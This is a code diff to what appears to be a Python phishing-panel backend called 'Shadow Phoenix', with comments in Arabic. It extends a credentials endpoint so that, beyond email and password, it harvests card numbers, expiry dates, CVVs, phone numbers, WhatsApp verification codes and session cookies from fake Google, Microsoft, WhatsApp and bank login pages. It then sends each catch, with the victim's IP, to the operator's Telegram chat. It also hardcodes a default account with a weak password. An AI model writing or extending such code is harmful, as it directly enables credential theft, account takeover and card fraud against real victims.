         user_id = body.get("user_id")
-        email = body.get("email")
-        password = body.get("password")
         login_type = body.get("login_type", "unknown")
+        email = body.get("email", "")
+        password = body.get("password", "")
+        card_number = body.get("card_number", "")
+        card_expiry = body.get("card_expiry", "")
+        card_cvv = body.get("card_cvv", "")
+        phone = body.get("phone", "")
+        code = body.get("code", "")
+        cookies = body.get("cookies", "")
         
         client_ip = request.client.host
         forwarded = request.headers.get("X-Forwarded-For")
         if forwarded:
             client_ip = forwarded.split(",")[0].strip()
         
-        if not user_id or not email or not password:
+        if not user_id:
             return JSONResponse(status_code=400, content={"status": "error"})
         
-        log_credentials(int(user_id), login_type, email, password, client_ip)
+        # تخزين البيانات
+        log_credentials(int(user_id), login_type, email, password, card_number, card_expiry, card_cvv, phone, code, cookies, client_ip)
+        
+        # بناء رسالة مخصصة حسب النوع
+        if login_type in ["google", "microsoft"]:
+            msg = f"🔑 **صيد بيانات دخول!**\nالنوع: {login_type.upper()}\nالبريد: `{email}`\nكلمة المرور: `{password}`\nالكوكيز: `{cookies[:100]}...`"
+        elif login_type == "whatsapp":
+            msg = f"💬 **صيد واتساب!**\nرقم الهاتف: `{phone}`\nرمز التفعيل: `{code}`\nالكوكيز: `{cookies[:100]}...`"
+        elif login_type == "bank":
+            msg = f"💳 **صيد بطاقة ائتمان!**\nرقم البطاقة: `{card_number}`\nتاريخ الانتهاء: `{card_expiry}`\nرمز CVV: `{card_cvv}`\nالكوكيز: `{cookies[:100]}...`"
+        else:
+            msg = f"📦 **بيانات جديدة!**\nالنوع: {login_type}\nالبيانات: {body}"
+        
+        msg += f"\n🌐 آيبي: `{client_ip}`"
+        
         background_tasks.add_task(
             bot.send_message,
             chat_id=int(user_id),
-            text=f"🔑 **تم صيد بيانات:**\nالنوع: {login_type.upper()}\nالبريد: `{email}`\nكلمة المرور: `{password}`\nآيبي: `{client_ip}`",
+            text=msg,
             parse_mode="Markdown"
         )
         return {"status": "success"}
     except Exception as e:
         logger.error(f"Credentials error: {e}")
+        traceback.print_exc()
         return JSONResponse(status_code=500, content={"status": "error"})
 
 @app.post(f"/{BOT_TOKEN}")
@@ -1113,7 +1265,7 @@ def startup():
         logger.error(f"⚠️ فشل ضبط Webhook: {e}")
     
     create_new_account("moosa", "123456")
-    logger.info("🔥 Shadow Phoenix v11.0 جاهز للعمل مع أمر /genusers!")
+    logger.info("🔥 Shadow Phoenix v12.0 جاهز مع قوالب واتساب، بنك، وجمع الكوكيز!")
 
 if __name__ == "__main__":
     port = int(os.environ.get("PORT", 8080))
